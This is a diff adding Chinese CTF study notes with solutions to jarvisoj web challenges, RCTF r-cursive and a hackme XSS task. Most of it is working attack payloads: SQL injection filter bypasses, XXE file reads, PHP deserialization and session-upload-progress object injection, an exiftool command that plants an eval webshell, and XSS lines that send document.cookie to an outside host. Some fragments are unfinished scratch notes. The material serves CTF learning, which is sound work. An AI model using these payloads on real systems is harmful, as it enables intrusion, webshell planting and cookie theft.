@@ -2167,3 +2167,385 @@
 	https://www.secpulse.com/archives/29826.html
 	https://bbs.ichunqiu.com/thread-38901-1-1.html
 	先缓缓吧，phpstudy里已经搭好环境
+
+
+# jarvisoj inject
+    http://web.jarvisoj.com:32794/index.php~
+    得到源码
+    <?php
+        require("config.php");
+        $table = $_GET['table']?$_GET['table']:"test";
+        $table = Filter($table);
+        mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
+        $sql = "select 'flag{xxx}' from secret_{$table}";
+        $ret = sql_query($sql);
+        echo $ret[0];
+    ?>
+    ?table=flag 正常响应 => 存在 secret_flag 表
+    注意到这个反引号 ``，其作用是区分 MySQL 保留字与普通字符
+    如 create table desc 肯定报错
+    而 create table `desc` 则能成功执行
+
+    本地尝试可得 
+    desc `abc` `def`
+    desc abc def 效果是一样的
+    结合题目 => desc `secret_flag` `
+    （`此处如果是 desc `secret_flag`` 将被认为是执行 desc secret_flag`）
+    顺手执行
+    ?table=flag`%20`%20union%20select%201
+    发现还是没有变化，依旧显示 flag{xxx}
+    不要灰心，这只显示了一条数据而已，加入 limit 试试
+    ?table=flag`%20`%20union%20select%201%20limit%201,2
+    成功得到1
+    ?table=flag`%20`%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7365637265745f666c6167%20limit%201,1
+    (此处 table_name 的值要进行 hex 编码）
+    查找所有字段 => flagUwillNeverKnow
+    接着查询内容 ?table=flag`%20`%20union%20select%20flagUwillNeverKnow%20from%20secret_flag%20limit%201,1
+    得到flag
+    PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示数据
+    如?table=flag`%20`%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag
+
+# jarvisoj api调用（xxe入门题）
+    请设法获得目标机器/home/ctf/flag.txt中的flag值。
+	参考 https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/
+	
+	常规系统里对接收的请求都会做限制，比如POST之以content-type的application/x-www-form-urlencoded接收，但在一些框架系统里，框架会自动帮开发者识别传入的数据
+
+	POST 提交数据的四种常见方式
+	application/x-www-form-urlencoded 
+	multipart/form-data
+	application/json
+	application/xml
+
+	比如：默认为application/x-www-form-urlencoded接收的我只需修改为 application/json
+	即可传入JSON格式的数据，XML同理
+
+	这将导致原本不存在xml解析的地方可能存在XXE漏洞
+
+
+    function XHR() {
+        var xhr;
+        try {xhr = new XMLHttpRequest();}
+        catch(e) {
+            var IEXHRVers =["Msxml3.XMLHTTP","Msxml2.XMLHTTP","Microsoft.XMLHTTP"];
+            for (var i=0,len=IEXHRVers.length;i< len;i++) {
+                try {xhr = new ActiveXObject(IEXHRVers[i]);}
+                catch(e) {continue;}
+            }
+        }
+        return xhr;
+    }
+
+    function send(){
+    evil_input = document.getElementById("evil-input").value;
+    var xhr = XHR();
+        xhr.open("post","/api/v1.0/try",true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState==4 && xhr.status==201) {
+                data = JSON.parse(xhr.responseText);
+                tip_area = document.getElementById("tip-area");
+                tip_area.value = data.task.search+data.task.value;
+            }
+        };
+        xhr.setRequestHeader("Content-Type","application/json");
+        xhr.send('{"search":"'+evil_input+'","value":"own"}');
+    }
+
+    payload:
+    Content-Type: application/xml
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <!DOCTYPE data[
+    <!ENTITY file SYSTEM "file:////home/ctf/flag.txt">
+    ]>
+	<data>&file;</data>
+
+# jarvisoj 神盾局的秘密
+	/showimg.php?img=c2hvd2ltZy5waHA= 读取 showing.php 源码
+	<?php
+		$f = $_GET['img'];
+		if (!empty($f)) {
+			$f = base64_decode($f);
+			if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE 
+			&& stripos($f,'\\')===FALSE	&& stripos($f,'pctf')===FALSE) {
+				readfile($f);
+			} else {
+				echo "File not found!";
+			}
+		}
+	?>
+
+	同理可得 index.php
+	<?php 
+		require_once('shield.php');
+		$x = new Shield();
+		isset($_GET['class']) && $g = $_GET['class'];
+		if (!empty($g)) {
+			$x = unserialize($g);
+		}
+		echo $x->readfile();
+	?>
+
+	shield.php
+	<?php
+		//flag is in pctf.php
+		class Shield {
+			public $file;
+			function __construct($filename = '') {
+				$this -> file = $filename;
+			}
+			
+			function readfile() {
+				if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+				&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+					return @file_get_contents($this->file);
+				}
+			}
+		}
+	?>
+
+	payload:
+	/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
+
+
+# jarvisoj port51
+	➜  ~ sudo curl --local-port 51 http://web.jarvisoj.com:32770/
+	<!DOCTYPE html>
+	<html>
+	<head>
+	<title>Web 100</title>
+	<style type="text/css">
+		body {
+			background:gray;
+			text-align:center;
+		}
+	</style>
+	</head>
+
+	<body>
+		<h3>Yeah!! Here your flag:PCTF{M45t3r_oF_CuRl}</h3>	
+	</body>
+	</html>
+	
+# jarvisoj login
+	header 头里面发现 hint: "select * from `admin` where password='".md5($pass,true)."'"
+	md5(string, raw)
+	string 要计算的字符串 
+	raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数
+	参考 https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html
+		http://www.am0s.com/functions/204.html
+	有个牛逼的字符串： ffifdyop
+	传入之后，最终的 sql 语句变为 select * from `admin` where password=''or'6�]��!r,��b'
+	成功闭合，得到万能密码
+
+
+# jarvisoj IN A Mess
+	<?php
+		error_reporting(0);
+		echo "<!--index.phps-->";
+
+		if(!$_GET['id']) {
+			header('Location: index.php?id=1');
+			exit();
+		}
+		$id=$_GET['id'];
+		$a=$_GET['a'];
+		$b=$_GET['b'];
+		if(stripos($a,'.')) {
+			echo 'Hahahahahaha';
+			return ;
+		}
+		$data = @file_get_contents($a,'r');
+		if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 
+		and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) {
+			require("flag.txt");
+		}
+		else {
+			print "work harder!harder!harder!";
+		}
+	?>
+
+	payload1: index.php/?id=a&a=php://input&b=%0034253
+	post: 1112 is a nice lab!
+	eregi() 会被 %00 截断，但 strlen() 不会
+	==>  <!--index.phps-->﻿Come ON!!! {/^HT2mCpcvOLf}
+
+	进入该目录，自动跳转到 web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1
+	
+	发现空格被过滤，尝试绕过
+	- 使用注释绕过，/**/
+	- 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格
+	- 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a
+	这里可以用 /*233*/ 代替空格
+	
+	order by 没有回显，放弃该法
+	/?id=2/*233*/uunionnion/*233*/seselectlect/*233*/1,2,3%23
+	得到 3， 说明字段数也是 3
+
+	payload2: 
+	获取所有数据库名
+	?id=2/*233*/uniounionn/*233*/selselectect/*233*/1,2,group_concat(schema_name)/*233*/frfromom/*233*/information_schema.schemata%23
+	==> information_schema,test
+
+	获取本数据库内的所有表名
+	?id=2/*233*/uniounionn/*233*/selselectect/*233*/1,2,group_concat(table_name)/*233*/frfromom/*233*/information_schema.tables/*233*/where/*233*/table_schema=database()%23
+	==> content
+	（以上两步可省略）
+
+	获取所有字段名
+	?id=2/*233*/uniounionn/*233*/selselectect/*233*/1,2,group_concat(column_name)/*233*/frfromom/*233*/information_schema.columns/*233*/where/*233*/table_name=0x636f6e74656e74%23
+	==> id,context,title
+
+	获取所有数据
+	?id=2/*233*/uniounionn/*233*/selselectect/*233*/1,2,group_concat(id,context,title)/*233*/frfromom/*233*/content%23
+	==> 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666
+
+# jarvisoj PHPINFO
+	下面是题目给出的源码
+	<?php
+	//A webshell is wait for you
+	ini_set('session.serialize_handler', 'php');
+	session_start();
+	class OowoO {
+		public $mdzz;
+		function __construct() {
+			$this->mdzz = 'phpinfo();';
+		}
+		
+		function __destruct() {
+			eval($this->mdzz);
+		}
+	}
+	if(isset($_GET['phpinfo'])) {
+		$m = new OowoO();
+	}
+	else {
+		highlight_string(file_get_contents('index.php'));
+	}
+	?>
+	涉及到几个知识点
+	1.[PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患](https://github.com/80vul/phpcodz/blob/master/research/pch-013.md)
+	在设置 SESSION 和读取 SESSION 两个阶段中，如果使用了不同的序列化方法，将会导致任意对象注入，进而导致反序列化漏洞。<?php
+	例如：
+		$_SESSION['ryat'] = '|O:8:"stdClass":0:{}';
+		存储时使用 php_serialize ==> a:1:{s:4:"ryat";s:20:"|O:8:"stdClass":0:{}";}
+		反序列化使用 php ==> 
+		// var_dump($_SESSION);
+		array(1) {
+			["a:1:{s:4:"ryat";s:20:""]=>
+			object(stdClass)#1 (0) {
+			}
+		}
+	即 PHP 获取 SESSION 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”，
+	并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，找到下一个竖线，执行同样的操作，
+	直到成功。
+	明摆着有 eval()，但 $mdzz 好像不可控，那如何利用它执行我们想要的操作呢，这就需要用到下一个知识。
+	
+	2.[有趣的 php 反序列化总结](http://www.91ri.org/15925.html)
+	仔细查看给出的 phpinfo 配置文件，发现了 session.upload_progress.enabled 打开，并且 session.upload_progress.cleanup 关闭。
+	这就极大提高了漏洞的利用成功率。如果此选项 session.upload_progress.cleanup 打开，那么在利用时攻击者需要上传 large and crash 文件，来使得我们传入的data得以执行。
+	https://img-blog.csdn.net/20171103001723738?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd3lfOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast
+	当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求就会在 $_SESSION 中添加一组数据。
+	所以可以通过 session.upload_progress 来设置 session。
+
+	如果不指定，PHP 默认使用 “php“ 作为 session 序列化的方法。
+	你可以试试，设置 `$_SESSION['a|b'] = 1;`，会发现实际上设置不进去，这就是 “php“ 的特性。
+
+	正常用法参见 example#1 http://php.net/manual/zh/session.upload-progress.php，配合 Ajax 就能显示上传进度
+
+	filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:19:\"print_r($_SESSION);\";}"
+	Array (
+		[a:1:{s:24:"upload_progress_12312131";a:5:{s:10:"start_time";i:1551019950;s:14:"content_length";i:434;s:15:"bytes_processed";i:434;s:4:"done";b:1;s:5:"files";
+		 a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:55:"] 
+		=> OowoO Object	(
+				[mdzz] => print_r($_SESSION);
+		)
+	)
+
+	存入 session 里的形式是这样的，由此看出，field_name 也是可控的，不一定要用 filename
+	$_SESSION["upload_progress_123"] = array(
+		"start_time" => 1234567890,   // The request time
+		"content_length" => 57343257, // POST content length
+		"bytes_processed" => 453489,  // Amount of bytes received and processed
+		"done" => false,              // true when the POST handler has finished, successfully or not
+		"files" => array(
+			0 => array(
+				"field_name" => "file1",       // Name of the <input/> field
+				// The following 3 elements equals those in $_FILES
+				"name" => "foo.avi",
+				"tmp_name" => "/tmp/phpxxxxxx",
+				"error" => 0,
+				"done" => true,                // True when the POST handler has finished handling this file
+				"start_time" => 1234567890,    // When this file has started to be processed
+				"bytes_processed" => 57343250, // Amount of bytes received and processed for this file
+			)
+		)
+	)
+
+
+# jarvisoj 图片上传
+	请设法获取 /home/ctf/flag.txt 中的flag值。(建议使用png文件上传)
+	扫目录得到一个 test.php，点进去发现是 phpinfo 界面
+	[phpinfo可以告诉我们什么](http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/)
+	从中看到有个 imagick 扩展，此外 disable_function 为空
+	imagemagick 存在 [cve](http://www.2cto.com/article/201605/505823.html)
+	这里可以使用 exiftool 工具，111.png 是本地已有的图像
+	exiftool -label="\"|/bin/echo \<?php \@eval\(\\$\_POST\[x\]\)\;?\> > 
+	/opt/lampp/htdocs/uploads/x.php; \"" 111.png
+
+	因为路径已知，直接 cat /home/ctf/flag.txt > /opt/lampp/htdocs/uploads/flag.txt 
+
+	exiftool -label="\"|/bin/cat /home/ctf/flag.txt > /opt/lampp/htdocs/uploads/flag.txt ; \"" 111.png
+
+	按照 一叶飘零 的 wp，思路是这样，但一直没复现成功（可能挂了删除马，云屿师傅建议开几个线程，连续写，连续读
+	注意这里 是需要转义两次的意思是要在图片里面带有一个 这样在服务器上echo写入的时候才会保留
+	先上传一次带有后门的图片得到图片路径 然后拼接在发包一次修改 filetype 的参数为 show
+	最后上菜刀得到flag
+
+
+# jarvisoj Chopper
+	/proxy.php?url=202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php
+
+
+# 2018-RCTF r-cursive
+	<?php
+	sha1($_SERVER['REMOTE_ADDR']) === 'f6e5575f93a408c5cb709c73eaa822cb09b4d0f7' ?: die();
+	';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
+
+	这个绕过有点牛逼：curl "http://xxxx.sandbox.r-cursive.ml:1337/?cmd=eval(next(getallheaders()));" -H "User-Agent: phpinfo();" -H "Accept: asdasd/asdasda"
+
+	(PHP 4 >= 4.0.4, PHP 5, PHP 7)
+	get_defined_vars — 返回由所有已定义变量所组成的数组
+
+#hackme xss
+
+	<img STYLE="background-image:url(javascript:alert('XSS'))">
+
+<img STYLE="background-image:url(http://demo.wywwzjj.top:8001)">
+
+http://demo.wywwzjj.top:8001
+
+
+
+<script>
+document.location="http://demo.wywwzjj.top:8001?cookie="+document.cookie
+new Image().src="http://demo.wywwzjj.top:8001?cookie="+document.cookie
+</script>
+<img src="http://demo.wywwzjj.top:8001?cookie="+document.cookie></img>
+
+<svg/onload="document.location='http://demo.wywwzjj.top:8001'">
+
+
+
+<script
+)
+onmouseover
+onload
+onfocus
+<iframe
+
+<svg/onload=document.location="http://demo.wywwzjj.top:8001?cookie="+document.url>
+url --> undefinded
+referer --> localhost/read.php
+
+所以咱们可以看看 config.php 有什么内容
